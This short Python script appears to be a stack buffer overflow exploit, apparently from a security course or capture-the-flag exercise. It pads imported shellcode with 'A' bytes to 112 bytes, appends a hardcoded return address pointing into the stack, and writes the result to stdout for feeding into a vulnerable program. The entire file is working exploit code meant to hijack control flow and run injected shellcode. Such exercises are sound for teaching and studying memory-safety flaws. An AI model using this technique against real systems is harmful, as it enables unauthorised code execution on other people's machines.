from shellcode import shellcode
import sys

length = 112
padding = length - len(shellcode)
payload = shellcode + b"A" * padding
retAdr = b"\x8c\xd5\xf6\xff"

sys.stdout.buffer.write(payload + retAdr)
